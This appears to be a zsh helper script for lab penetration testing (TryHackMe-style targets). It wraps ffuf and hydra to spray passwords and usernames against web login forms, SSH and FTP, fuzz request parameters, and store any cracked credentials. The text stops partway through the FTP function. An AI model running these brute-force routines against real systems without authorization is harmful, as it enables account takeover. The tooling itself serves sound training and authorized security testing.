# ========================
# hydra helpers
# ========================

_ffufweb-usage() {
  echo "usage:"
  echo "  ffufweb [options] <url> <username>       # password spray (default)"
  echo "  ffufweb -U [options] <url> <password>     # username spray"
  echo ""
  echo "options:"
  echo "  -U                     fixed password, FUZZ in username (wordlist: \$RECON_USERLIST)"
  echo "  -d <data>              POST body (default pass: username=<user>&password=FUZZ"
  echo "                         default -U: username=FUZZ&password=<pass>)"
  echo "  -w <file>              wordlist (default: \$RECON_PASSLIST or \$RECON_USERLIST with -U)"
  echo "  -H <header>            extra header (repeatable)"
  echo "  -fw|-fs|-fc|-fl <n>    ffuf filters (e.g. -fw 8)"
  echo "  -fr <regex>            filter regex"
  echo "  -t <n>                 threads (default 40)"
  echo "  -n                     print command only"
  echo ""
  echo "examples:"
  echo "  ffufweb http://lookup.thm/login.php admin -fw 8"
  echo "  ffufweb -U http://lookup.thm/login.php password123 -fr 'Wrong username or password'"
  echo "  ffufweb -U http://lookup.thm/login.php 'Password123' -w users.txt -fr '...'"
  echo ""
  echo "  -fw は password spray 向け。username spray は失敗レスポンスの words/size が違うので要調整"
  echo ""
  echo "  on hit: creds → creds-list (Ctrl+C でもヒット分は保存)"
  echo ""
  echo "  hydraweb: hydra http-post-form (:F/:S). ffufweb: ffuf spray (-fw など)"
}

_reqfuzz-usage() {
  echo "usage:"
  echo "  reqfuzz [options] <url> <param> <start> <end>"
  echo ""
  echo "options:"
  echo "  -X GET|POST          request method (default: GET)"
  echo "  -d <data>            POST body template (use {value}; default: <param>={value})"
  echo "  -H <header>          extra header (repeatable)"
  echo "  -k                   ignore TLS verification"
  echo "  -s                   show only differing responses"
  echo "  -o <file>            write results to file"
  echo "  --deep               include words/lines/hash/note and save response bodies"
  echo "  -n                   dry-run (print commands only)"
  echo ""
  echo "examples:"
  echo "  reqfuzz http://\$IP/th1s_1s_h1dd3n/ secret 0 99"
  echo "  reqfuzz -k http://\$IP/app/ secret 0 99"
  echo "  reqfuzz -X POST -d 'secret={value}&submit=1' http://\$IP/app/ secret 0 99"
  echo ""
  echo "alias:"
  echo "  param-fuzz -> reqfuzz"
}

_reqfuzz-build-url() {
  local base_url="$1" param="$2" value="$3"
  # TODO: Existing query parameters are not replaced.
  # Future versions should support parameter overwrite.
  local sep='?'
  [[ "$base_url" == *\?* ]] && sep='&'
  printf '%s%s%s=%s\n' "$base_url" "$sep" "$param" "$value"
}

_reqfuzz-curl() {
  local debug=0
  [[ "${REQFUZZ_DEBUG:-0}" == 1 ]] && debug=1
  if (( debug )); then
    "$@"
  else
    "$@" 2>/dev/null
  fi
}

_reqfuzz-body-summary() {
  local body_file="$1" needle="$2"
  local raw_body normalized_body note hash
  raw_body="$(<"$body_file")"
  normalized_body="$raw_body"
  if [[ -n "$needle" ]]; then
    normalized_body="${normalized_body//"$needle"/<FUZZ>}"
  fi

  local bytes words lines
  bytes=$(wc -c < "$body_file" | tr -d '[:space:]')
  words=$(printf '%s' "$raw_body" | wc -w | tr -d '[:space:]')
  lines=$(printf '%s' "$raw_body" | wc -l | tr -d '[:space:]')
  hash=$(printf '%s' "$normalized_body" | sha1sum | awk '{print substr($1,1,8)}')
  note=$(printf '%s' "$raw_body" | sed -nE 's/.*<title[^>]*>([^<]*)<\/title>.*/\1/ip' | head -n 1)
  if [[ -z "$note" ]]; then
    note=$(printf '%s' "$raw_body" \
      | sed -E 's@<script[^>]*>.*</script>@@Ig; s@<style[^>]*>.*</style>@@Ig; s@<[^>]+>@ @g; s/[[:space:]]+/ /g; s/^ //; s/ $//' \
      | cut -c1-64)
  fi
  [[ -n "$note" ]] || note="(empty)"
  printf '%s\t%s\t%s\t%s\t%s\n' "$bytes" "$words" "$lines" "$hash" "$note"
}

reqfuzz() {
  local method="GET" post_template="" dry_run=0 only_diff=0 insecure=0 output_file="" deep=0
  local debug=0
  [[ "${REQFUZZ_DEBUG:-0}" == 1 ]] && debug=1
  local connect_timeout="${REQFUZZ_CONNECT_TIMEOUT:-10}"
  local max_time="${REQFUZZ_MAX_TIME:-20}"
  local -a headers=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -X)
        method="${2:-}"
        shift 2
        ;;
      -d)
        post_template="$2"
        shift 2
        ;;
      -H)
        headers+=("$2")
        shift 2
        ;;
      -k)
        insecure=1
        shift
        ;;
      -s)
        only_diff=1
        shift
        ;;
      -o)
        output_file="$2"
        shift 2
        ;;
      --deep)
        deep=1
        shift
        ;;
      -n)
        dry_run=1
        shift
        ;;
      -h|--help)
        _reqfuzz-usage
        return 0
        ;;
      -*)
        echo "[-] reqfuzz: unknown option: $1" >&2
        return 1
        ;;
      *)
        break
        ;;
    esac
  done

  if [[ $# -lt 4 ]]; then
    _reqfuzz-usage
    return 1
  fi

  local base_url="$1" param="$2" start="$3" end="$4"
  if [[ ! "$start" =~ ^-?[0-9]+$ || ! "$end" =~ ^-?[0-9]+$ ]]; then
    echo "[-] reqfuzz: start/end must be integers" >&2
    return 1
  fi
  if (( start > end )); then
    echo "[-] reqfuzz: start must be <= end" >&2
    return 1
  fi

  if [[ "$method" == POST && -z "$post_template" ]]; then
    post_template="${param}={value}"
  fi

  if [[ "$method" != GET && "$method" != POST ]]; then
    echo "[-] reqfuzz: -X must be GET or POST" >&2
    return 1
  fi

  if [[ -n "$output_file" ]]; then
    : > "$output_file" || return 1
  fi

  local tmpdir="" baseline_body="" baseline_url
  if (( deep )); then
    tmpdir="$(mktemp -d "${TMPDIR:-/tmp}/reqfuzz.XXXXXX")" || return 1
    trap 'rm -rf "$tmpdir"' EXIT
    trap 'rm -rf "$tmpdir"; return 130' INT TERM
    baseline_body="$tmpdir/baseline.body"
  fi
  baseline_url="$(_reqfuzz-build-url "$base_url" "$param" "$start")" || return 1

  local -a curl_base=(curl -sS)
  curl_base+=(--connect-timeout "$connect_timeout" --max-time "$max_time")
  (( insecure )) && curl_base+=(-k)
  for value in "${headers[@]}"; do
    curl_base+=(-H "$value")
  done

  local baseline_status baseline_bytes baseline_words baseline_lines baseline_hash baseline_note
  local value body_file url http_status bytes words lines hash note body response_metrics baseline_status_bytes
  local baseline_summary_row
  local -a diff_rows diff_keys

  _reqfuzz-emit() {
    local line="$1"
    printf '%s\n' "$line"
    if [[ -n "$output_file" ]]; then
      printf '%s\n' "$line" >> "$output_file"
    fi
  }

  _reqfuzz-debug() {
    (( debug )) || return 0
    local line="$1"
    printf '%s\n' "$line" >&2
  }

  _reqfuzz-debug-curl() {
    (( debug )) || return 0
    local value="$1" method_name="$2" url="$3" body_text="$4" out_target="$5" time_total="${6:-}"
    local -a curl_cmd=("${curl_base[@]}" -o "$out_target" -w '%{http_code}\t%{size_download}\t%{time_total}')
    if [[ "$method_name" == POST ]]; then
      curl_cmd+=(-X POST -d "$body_text" "$base_url")
      url="$base_url"
    else
      curl_cmd+=("$url")
    fi
    local rendered=""
    local arg
    for arg in "${curl_cmd[@]}"; do
      rendered+="${rendered:+ }$(printf '%q' "$arg")"
    done
    printf '[debug] value=%s\n[debug] method=%s\n[debug] url=%s\n[debug] curl=%s\n[debug] time_total=%s\n' "$value" "$method_name" "$url" "$rendered" "${time_total:-0}" >&2
  }

  if (( dry_run )); then
    _reqfuzz-emit "[*] dry-run: baseline $method $baseline_url"
    for ((value = start; value <= end; value++)); do
      if [[ "$method" == GET ]]; then
        url="$(_reqfuzz-build-url "$base_url" "$param" "$value")" || return 1
        _reqfuzz-emit "[*] GET  $url"
      else
        body="${post_template//\{value\}/$value}"
        _reqfuzz-emit "[*] POST $base_url  body=$body"
      fi
    done
    trap - EXIT INT TERM
    [[ -n "$tmpdir" ]] && rm -rf "$tmpdir"
    return 0
  fi

  if [[ "$method" == GET ]]; then
    if (( deep )); then
      : > "$baseline_body"
      baseline_status_bytes=$(_reqfuzz-curl "${curl_base[@]}" -o "$baseline_body" -w '%{http_code}\t%{size_download}\t%{time_total}' "$baseline_url")
    else
      baseline_status_bytes=$(_reqfuzz-curl "${curl_base[@]}" -o /dev/null -w '%{http_code}\t%{size_download}\t%{time_total}' "$baseline_url")
    fi
  else
    body="${post_template//\{value\}/$start}"
    if (( deep )); then
      : > "$baseline_body"
      baseline_status_bytes=$(_reqfuzz-curl "${curl_base[@]}" -X POST -o "$baseline_body" -w '%{http_code}\t%{size_download}\t%{time_total}' -d "$body" "$base_url")
    else
      baseline_status_bytes=$(_reqfuzz-curl "${curl_base[@]}" -X POST -o /dev/null -w '%{http_code}\t%{size_download}\t%{time_total}' -d "$body" "$base_url")
    fi
  fi

  if [[ -z "${baseline_status_bytes:-}" && -z "${baseline_status:-}" ]]; then
    if (( deep )); then
      [[ -s "$baseline_body" ]] || {
        echo "[-] reqfuzz: interrupted or baseline body missing" >&2
        return 130
      }
    fi
    echo "[-] reqfuzz: baseline request failed" >&2
    return 1
  fi

  if (( deep )); then
    IFS=$'\t' read -r baseline_status baseline_bytes baseline_time <<< "$baseline_status_bytes"
    local baseline_metrics
    baseline_metrics="$(_reqfuzz-body-summary "$baseline_body" "$start")"
    IFS=$'\t' read -r baseline_bytes baseline_words baseline_lines baseline_hash baseline_note <<< "$baseline_metrics"
    baseline_summary_row="$(printf '%-8s %-6s %-7s %-7s %-7s %-8s %s' "$start" "$baseline_status" "$baseline_bytes" "$baseline_words" "$baseline_lines" "$baseline_hash" "$baseline_note")"
    _reqfuzz-debug-curl "$start" "$method" "$baseline_url" "${post_template//\{value\}/$start}" "$baseline_body" "$baseline_time"
    if (( ! only_diff )); then
      _reqfuzz-emit "VALUE    STATUS BYTES   WORDS   LINES   HASH     NOTE"
      _reqfuzz-emit "$baseline_summary_row"
    else
      diff_keys+=("$baseline_status"$'\t'"$baseline_bytes")
      diff_rows+=("$baseline_summary_row")
    fi
  else
    IFS=$'\t' read -r baseline_status baseline_bytes baseline_time <<< "$baseline_status_bytes"
    baseline_summary_row="$(printf '%-8s %-6s %-7s' "$start" "$baseline_status" "$baseline_bytes")"
    _reqfuzz-debug-curl "$start" "$method" "$baseline_url" "${post_template//\{value\}/$start}" /dev/null "$baseline_time"
    if (( ! only_diff )); then
      _reqfuzz-emit "VALUE    STATUS BYTES"
      _reqfuzz-emit "$baseline_summary_row"
    else
      diff_keys+=("$baseline_status"$'\t'"$baseline_bytes")
      diff_rows+=("$baseline_summary_row")
    fi
  fi

  for ((value = start + 1; value <= end; value++)); do
    url="$(_reqfuzz-build-url "$base_url" "$param" "$value")" || return 1

    if [[ "$method" == GET ]]; then
      if (( deep )); then
        body_file="$tmpdir/body.$value"
        : > "$body_file"
        response_metrics=$(_reqfuzz-curl "${curl_base[@]}" -o "$body_file" -w '%{http_code}\t%{size_download}\t%{time_total}' "$url")
      else
        response_metrics=$(_reqfuzz-curl "${curl_base[@]}" -o /dev/null -w '%{http_code}\t%{size_download}\t%{time_total}' "$url")
      fi
    else
      body="${post_template//\{value\}/$value}"
      if (( deep )); then
        body_file="$tmpdir/body.$value"
        : > "$body_file"
        response_metrics=$(_reqfuzz-curl "${curl_base[@]}" -X POST -o "$body_file" -w '%{http_code}\t%{size_download}\t%{time_total}' -d "$body" "$base_url")
      else
        response_metrics=$(_reqfuzz-curl "${curl_base[@]}" -X POST -o /dev/null -w '%{http_code}\t%{size_download}\t%{time_total}' -d "$body" "$base_url")
      fi
    fi

    if [[ -z "$response_metrics" ]]; then
      http_status="ERR"
      bytes="0"
      curl_time="0"
    else
      IFS=$'\t' read -r http_status bytes curl_time <<< "$response_metrics"
    fi

    if [[ -z "$http_status" ]]; then
      http_status="ERR"
      bytes="0"
      curl_time="0"
    fi

    if (( deep )); then
      _reqfuzz-debug-curl "$value" "$method" "$url" "$body" "$body_file" "$curl_time"
    else
      _reqfuzz-debug-curl "$value" "$method" "$url" "$body" /dev/null "$curl_time"
    fi

    local same_baseline=0
    if [[ "$http_status" == "$baseline_status" && "$bytes" == "$baseline_bytes" ]]; then
      same_baseline=1
    fi
    if (( only_diff )) && (( same_baseline )); then
      continue
    fi

    if (( deep )); then
      local metrics
      if [[ -z "$http_status" || "$http_status" == "ERR" ]]; then
        words=0
        lines=0
        hash="ERR"
        note="(no response)"
      else
        metrics="$(_reqfuzz-body-summary "$body_file" "$value")"
        IFS=$'\t' read -r bytes words lines hash note <<< "$metrics"
      fi
      baseline_summary_row="$(printf '%-8s %-6s %-7s %-7s %-7s %-8s %s' "$value" "$http_status" "$bytes" "$words" "$lines" "$hash" "$note")"
    else
      baseline_summary_row="$(printf '%-8s %-6s %-7s' "$value" "$http_status" "$bytes")"
    fi

    if (( only_diff )); then
      diff_keys+=("$http_status"$'\t'"$bytes")
      diff_rows+=("$baseline_summary_row")
    else
      _reqfuzz-emit "$baseline_summary_row"
    fi
  done

  if (( only_diff )); then
    local most_common_key
    most_common_key="$(
      printf '%s\n' "${diff_keys[@]}" \
        | sort \
        | uniq -c \
        | sort -nr \
        | head -n 1 \
        | sed -E 's/^[[:space:]]*[0-9]+[[:space:]]+//'
    )"

    if (( deep )); then
      _reqfuzz-emit "VALUE    STATUS BYTES   WORDS   LINES   HASH     NOTE"
    else
      _reqfuzz-emit "VALUE    STATUS BYTES"
    fi

    local idx
    for ((idx = 1; idx <= ${#diff_rows[@]}; idx++)); do
      if [[ "${diff_keys[$idx]}" != "$most_common_key" ]]; then
        _reqfuzz-emit "${diff_rows[$idx]}"
      fi
    done
  fi

  if [[ -n "$tmpdir" ]]; then
    rm -rf "$tmpdir"
  fi
  trap - EXIT INT TERM
}

typeset -g REQFUZZ_SCRIPT_DIR="${${(%):-%N}:A:h}"

reqfuzz() {
  python3 "$REQFUZZ_SCRIPT_DIR/reqfuzz.py" "$@"
}

param-fuzz() {
  reqfuzz "$@"
}

svcguess() {
  python3 "$REQFUZZ_SCRIPT_DIR/svcguess.py" "$@"
}

_ffufweb-filters-summary() {
  local -a extra=("$@")
  if (( ${#extra[@]} )); then
    echo "${extra[*]}"
  else
    echo "(none)"
  fi
}

_ffufweb-cred-ip() {
  local url="$1"
  if [[ -n "${IP:-}" ]]; then
    echo "$IP"
    return 0
  fi
  if [[ "$url" =~ ^https?://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
    echo "${match[1]}"
    return 0
  fi
  target-current 2>/dev/null
}

_ffufweb-import-creds() {
  local import_json=""
  if [[ -z "${_FFUFWEB_CRED_IP:-}" ]]; then
    return 0
  fi
  if [[ -z "${_FFUFWEB_USER:-}" && -z "${_FFUFWEB_PASS:-}" ]]; then
    return 0
  fi
  if [[ -f "${_FFUFWEB_JSON}.live" ]]; then
    import_json="${_FFUFWEB_JSON}.live"
  elif [[ -f "${_FFUFWEB_JSON:-}" ]]; then
    import_json="$_FFUFWEB_JSON"
  fi
  [[ -n "$import_json" ]] || return 0
  if [[ -n "${_FFUFWEB_USER:-}" ]]; then
    /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-ffuf \
      "$_FFUFWEB_CRED_IP" "$_FFUFWEB_USER" --file "$import_json"
  else
    /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-ffuf \
      "$_FFUFWEB_CRED_IP" --password "$_FFUFWEB_PASS" --file "$import_json"
  fi
}

_ffufweb-cleanup() {
  _ffufweb-import-creds
  if [[ -n "${_FFUFWEB_JSON:-}" ]]; then
    rm -f "$_FFUFWEB_JSON" "${_FFUFWEB_JSON}.live"
  fi
  rm -f "${_FFUFWEB_LOG:-}"
  unset _FFUFWEB_CRED_IP _FFUFWEB_USER _FFUFWEB_PASS _FFUFWEB_JSON _FFUFWEB_LOG
}

_ffufweb-ffuf-filter() {
  local json_live="$1" total="${2:-0}"
  /usr/bin/python3 -u -c "
import json, re, sys

json_live = sys.argv[1]
total_hint = int(sys.argv[2] or 0)
progress_re = re.compile(r'Progress:\s*\[(\d+)/(\d+)\]')
errors_re = re.compile(r'Errors:\s*(\d+)')
hit_re = re.compile(r'(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)')
ansi_re = re.compile(r'\x1b\[[0-9;?]*[ -/]*[@-~]')

state = {'cur': 0, 'tot': total_hint, 'errors': 0}
seen = set()
hits = []
header_done = False
progress_active = False
last_drawn = -1

def progress_line():
    cur, tot = state['cur'], state['tot']
    if not tot:
        return None
    pct = cur * 100 // tot
    err = state['errors']
    suffix = f'  errors={err}' if err else ''
    return f'[*] {cur}/{tot} ({pct}%){suffix}'

def ensure_header():
    global header_done
    if header_done:
        return
    sys.stderr.write('===== results =====\n')
    sys.stderr.flush()
    header_done = True

def clear_progress():
    global progress_active
    if progress_active:
        sys.stderr.write('\r\033[2K')
        sys.stderr.flush()
        progress_active = False

def show_progress(force=False):
    global progress_active, last_drawn
    pl = progress_line()
    if not pl:
        return
    if not force and state['cur'] == last_drawn:
        return
    last_drawn = state['cur']
    ensure_header()
    sys.stderr.write('\r\033[2K' + pl)
    sys.stderr.flush()
    progress_active = True

def write_live():
    with open(json_live, 'w', encoding='utf-8') as f:
        json.dump({'results': list(hits)}, f)

def add_hit(password, status, size):
    global progress_active, last_drawn
    if password in seen:
        return
    seen.add(password)
    hits.append({
        'input': {'FUZZ': password},
        'status': int(status),
        'length': int(size),
    })
    write_live()
    ensure_header()
    clear_progress()
    sys.stderr.write(f'[+] {password}\tstatus={status}\tsize={size}\n')
    sys.stderr.flush()
    last_drawn = -1
    show_progress(force=True)

def finish():
    ensure_header()
    clear_progress()
    if not seen:
        sys.stderr.write('[-] no passwords matched\n')
    sys.stderr.flush()

def apply_progress(text):
    ms = list(progress_re.finditer(text))
    if not ms:
        return
    m = ms[-1]
    state['cur'] = int(m.group(1))
    state['tot'] = int(m.group(2))
    em = errors_re.search(m.group(0))
    if em:
        state['errors'] = int(em.group(1))
    show_progress()

def apply_hits(text):
    for line in text.splitlines():
        line = ansi_re.sub('', line).strip()
        if not line:
            continue
        m = hit_re.search(line)
        if not m:
            continue
        add_hit(m.group(1), m.group(2), m.group(3))

def scan_buf(buf):
    clean = ansi_re.sub('', buf)
    if 'Progress:' in clean:
        apply_progress(clean)
    apply_hits(clean)

show_progress(force=True)

buf = ''
try:
    while True:
        chunk = sys.stdin.buffer.read(256)
        if not chunk:
            break
        buf += chunk.decode('utf-8', errors='replace')
        scan_buf(buf)
        if len(buf) > 8192:
            buf = buf[-4096:]
    if buf.strip():
        scan_buf(buf)
finally:
    finish()
" "$json_live" "$total"
}

ffufweb() {
  local url="" fixed="" data="" wordlist="" threads=40 dry_run=0 user_spray=0
  local user="" pass="" spray_label="passwords"
  local -a headers=( "Content-Type: application/x-www-form-urlencoded" )
  local -a ffuf_extra=()

  if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    _ffufweb-usage
    return 0
  fi

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -U)
        user_spray=1
        shift
        ;;
      -d)
        data="$2"
        shift 2
        ;;
      -w)
        wordlist="$2"
        shift 2
        ;;
      -H)
        headers+=("$2")
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -n)
        dry_run=1
        shift
        ;;
      -fw|-fs|-fc|-fl|-fr|-mc|-ms|-ml|-mr)
        ffuf_extra+=("$1" "$2")
        shift 2
        ;;
      http://*|https://*)
        url="$1"
        shift
        ;;
      -*)
        echo "[-] ffufweb: unknown option: $1" >&2
        return 1
        ;;
      *)
        if [[ -z "$fixed" ]]; then
          fixed="$1"
        else
          echo "[-] ffufweb: unexpected argument: $1" >&2
          return 1
        fi
        shift
        ;;
    esac
  done

  if [[ -z "$url" || -z "$fixed" ]]; then
    _ffufweb-usage
    return 1
  fi

  if (( user_spray )); then
    pass="$fixed"
    wordlist="${wordlist:-${RECON_USERLIST:-/usr/share/seclists/Usernames/Names/names.txt}}"
    spray_label="usernames"
    [[ -z "$data" ]] && data="username=FUZZ&password=${pass}"
  else
    user="$fixed"
    wordlist="${wordlist:-$RECON_PASSLIST}"
    [[ -z "$data" ]] && data="username=${user}&password=FUZZ"
  fi

  if [[ ! -f "$wordlist" ]]; then
    echo "[-] ffufweb: wordlist not found: $wordlist" >&2
    return 1
  fi

  if ! command -v ffuf >/dev/null 2>&1; then
    echo "[-] ffufweb: ffuf not found" >&2
    return 1
  fi

  local cred_ip json log rc wl_total cmd_str
  local -a run_cmd
  cred_ip="$(_ffufweb-cred-ip "$url")"
  wl_total="$(/usr/bin/wc -l <"$wordlist" | tr -d '[:space:]')"

  local -a cmd=(
    ffuf
    -w "$wordlist"
    -X POST
    -u "$url"
    -d "$data"
    -t "$threads"
    -o /dev/null
  )
  local hdr
  for hdr in "${headers[@]}"; do
    cmd+=(-H "$hdr")
  done
  cmd+=("${ffuf_extra[@]}")

  json="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/ffufweb.XXXXXX.json")"
  log="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/ffufweb.XXXXXX.log")"
  : >"${json}.live"

  _FFUFWEB_CRED_IP="$cred_ip"
  _FFUFWEB_USER="$user"
  _FFUFWEB_PASS="$pass"
  _FFUFWEB_JSON="$json"
  _FFUFWEB_LOG="$log"
  trap '_ffufweb-cleanup' EXIT INT TERM

  if command -v stdbuf >/dev/null 2>&1; then
    run_cmd=(stdbuf -o0 -e0 "${cmd[@]}")
  else
    run_cmd=("${cmd[@]}")
  fi
  cmd_str="${(j: :)${(@q)run_cmd}}"

  echo "[*] url: $url"
  if (( user_spray )); then
    echo "[*] mode: username spray (fixed password)"
    echo "[*] pass: $pass"
  else
    echo "[*] mode: password spray (fixed user)"
    echo "[*] user: $user"
  fi
  echo "[*] body: $data"
  echo "[*] wordlist: $wordlist"
  echo "[*] scan: ${wl_total:-?} ${spray_label}"
  echo "[*] filters: $(_ffufweb-filters-summary "${ffuf_extra[@]}")"
  if (( user_spray )) && [[ "${ffuf_extra[*]}" == *"-fw"* ]]; then
    echo "[i] -U + -fw: word count is often wrong for username spray — calibrate with curl or use -fr" >&2
  fi
  [[ -n "$cred_ip" ]] && echo "[*] creds ip: $cred_ip"
  echo ""

  if (( dry_run )); then
    echo "[*] cmd: $cmd_str"
    trap - EXIT INT TERM
    rm -f "$json" "${json}.live" "$log"
    unset _FFUFWEB_CRED_IP _FFUFWEB_USER _FFUFWEB_PASS _FFUFWEB_JSON _FFUFWEB_LOG
    return 0
  fi

  if command -v script >/dev/null 2>&1; then
    script -q -e -f -c "$cmd_str" /dev/null 2>&1 | _ffufweb-ffuf-filter "${json}.live" "$wl_total"
  else
    "${run_cmd[@]}" 2>&1 | _ffufweb-ffuf-filter "${json}.live" "$wl_total"
  fi
  rc=${pipestatus[1]:-$?}

  if [[ -z "$cred_ip" ]]; then
    echo "[i] creds ip unknown — target-set <ip> to auto-save hits" >&2
  fi

  return $rc
}

_hydraweb-usage() {
  echo "usage:"
  echo "  hydraweb [-H vhost] [target] <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post] [cookie]"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  -H vhost: Host header (THM: hydraweb -H lookup.thm /login.php ...)"
  echo "  cookie: sent as H=Cookie: ... (e.g. PHPSESSID=abc; security=low)"
  echo ""
  echo "examples:"
  echo "  hydraweb /login.php Rick F \"Invalid username or password\" username password"
  echo "  hydraweb -H lookup.thm /login.php admin F \"Wrong password\" username password"
  echo "  hydraweb /login.php admin F \"failed\" username password sub=Login \"PHPSESSID=abc; security=low\""
  echo ""
  echo "extra_post default: sub=Login  (matches login.php submit button)"
  echo "  on hit: creds → creds-list (hydra -V output, stops at first hit with -f)"
  echo ""
  echo "  word-count / size filters: use ffufweb (e.g. ffufweb http://lookup.thm/login.php admin -fw 8)"
}

hydraweb() {
  local target path user mode text userfield passfield extra_post cookie form host_header

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -H)
        host_header="$2"
        shift 2
        ;;
      *)
        break
        ;;
    esac
  done

  if [[ $# -ge 1 && "$1" =~ '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' ]]; then
    if [[ $# -lt 6 ]]; then
      _hydraweb-usage
      return 1
    fi
    target="$1"
    shift
  else
    if [[ $# -lt 5 ]]; then
      _hydraweb-usage
      return 1
    fi
    target="${IP:-}"
    if [[ -z "$target" ]]; then
      echo "no target: target-set <ip> or pass IP as first arg" >&2
      return 1
    fi
  fi

  path="$1"
  user="$2"
  mode="$3"
  text="$4"
  userfield="$5"
  passfield="${6:-password}"
  extra_post="${7:-sub=Login}"
  cookie="${8:-}"

  form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
  if [[ -n "$extra_post" ]]; then
    form="${form}&${extra_post}"
  fi
  if [[ -n "$host_header" ]]; then
    form="${form}:H=Host: ${host_header}"
  fi
  if [[ -n "$cookie" ]]; then
    form="${form}:H=Cookie: ${cookie}"
  fi
  form="${form}:${mode}=${text}"

  echo "[*] hydra form: ${form}"
  [[ -n "$host_header" ]] && echo "[*] vhost: ${host_header}"
  [[ -n "$cookie" ]] && echo "[*] cookie: ${cookie}"
  echo "[*] target: http://${host_header:-$target}${path}  user: $user"
  echo "[*] wordlist: $RECON_PASSLIST"

  local log rc
  log="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/hydraweb.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  /usr/bin/hydra -l "$user" \
    -P "$RECON_PASSLIST" \
    -t 32 -f -V \
    "$target" http-post-form \
    "$form" 2>&1 | /usr/bin/tee "$log"
  rc=${pipestatus[1]:-$?}

  /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-hydra "$target" --file "$log"

  return $rc
}

# usage: _hydra-parse-args <default_user> [args...]
# sets: _HYDRA_TARGET _HYDRA_USER _HYDRA_WORDLIST
_hydra-parse-args() {
  local default_user="$1"
  shift
  local -a args=("$@")

  _HYDRA_WORDLIST="$RECON_PASSLIST"
  _HYDRA_TARGET=""
  _HYDRA_USER=""

  if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
    _HYDRA_WORDLIST="${args[-1]:A}"
    if (( ${#args[@]} > 1 )); then
      args=("${args[1,-2]}")
    else
      args=()
    fi
  fi

  if [[ ${#args[@]} -ge 2 ]] && _recon-looks-like-host "${args[1]}"; then
    _HYDRA_TARGET="${args[1]}"
    _HYDRA_USER="${args[2]}"
  elif [[ ${#args[@]} -eq 2 ]] && _recon-looks-like-host "${args[2]}"; then
    _HYDRA_TARGET="${args[2]}"
    _HYDRA_USER="${args[1]}"
  elif [[ ${#args[@]} -eq 2 ]]; then
    _HYDRA_TARGET="${args[1]}"
    _HYDRA_USER="${args[2]}"
  elif [[ ${#args[@]} -eq 1 ]]; then
    if _recon-looks-like-host "${args[1]}"; then
      _HYDRA_TARGET="${args[1]}"
      _HYDRA_USER="$default_user"
    else
      _HYDRA_TARGET="${IP:-}"
      _HYDRA_USER="${args[1]}"
    fi
  elif [[ ${#args[@]} -eq 0 ]]; then
    _HYDRA_TARGET="${IP:-}"
    _HYDRA_USER="$default_user"
  else
    return 1
  fi

  [[ -n "$_HYDRA_TARGET" && -n "$_HYDRA_USER" ]]
}

_hydra-run-service() {
  local service="$1"
  local target="$2"
  local user="$3"
  local wordlist="$4"
  local threads="$5"
  local log_prefix="$6"
  local port="${7:-}"

  if [[ ! -f "$wordlist" ]]; then
    echo "wordlist not found: $wordlist"
    return 1
  fi

  local target_label="${service}://$target"
  [[ -n "$port" ]] && target_label="${target_label}:$port"
  echo "[*] target: $target_label  user: $user"
  echo "[*] wordlist: $wordlist"

  local log rc
  log="$(mktemp "${TMPDIR:-/tmp}/${log_prefix}.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  local -a hydra_cmd=(hydra -l "$user" -P "$wordlist" -t "$threads" -f -V)
  [[ -n "$port" ]] && hydra_cmd+=(-s "$port")
  hydra_cmd+=("$target" "$service")

  "${hydra_cmd[@]}" 2>&1 | tee "$log"
  rc=${pipestatus[1]}

  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"

  return $rc
}

_hydrassh-usage() {
  echo "usage: hydrassh [-p port] [target] <user> [wordlist]"
  echo "  default wordlist: \$RECON_PASSLIST"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydrassh root"
  echo "  hydrassh -p 6498 boring"
  echo "  hydrassh 10.10.10.10 admin ./wordlist.txt"
}

hydrassh() {
  local port="" threads=32
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p[0-9]*)
        port="${1#-p}"
        shift
        ;;
      -p)
        port="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -h|--help)
        _hydrassh-usage
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  if [[ ${#args[@]} -eq 0 ]]; then
    _hydrassh-usage >&2
    return 1
  fi

  _hydra-parse-args "" "${args[@]}" || {
    _hydrassh-usage >&2
    return 1
  }

  _hydra-run-service ssh "$_HYDRA_TARGET" "$_HYDRA_USER" "$_HYDRA_WORDLIST" "$threads" hydrassh "$port"
}

_hydraftp-usage() {
  echo "usage: hydraftp [-p port] [-t threads] [target] [user] [wordlist]"
  echo "  hydra FTP password spray (default user: anonymous)"
  echo "  default wordlist: \$RECON_PASSLIST   default threads: 16"
  echo "  target: IPv4 or FQDN (team.thm); omit when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydraftp                    # anonymous @ \$IP"
  echo "  hydraftp team.thm           # anonymous @ team.thm"
  echo "  hydraftp team.thm ./locks.txt"
  echo "  hydraftp ftpuser ./locks.txt"
  echo "  hydraftp -p 2121 team.thm ftpuser"
}

hydraftp() {
  local port="" threads=16
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p[0-9]*)
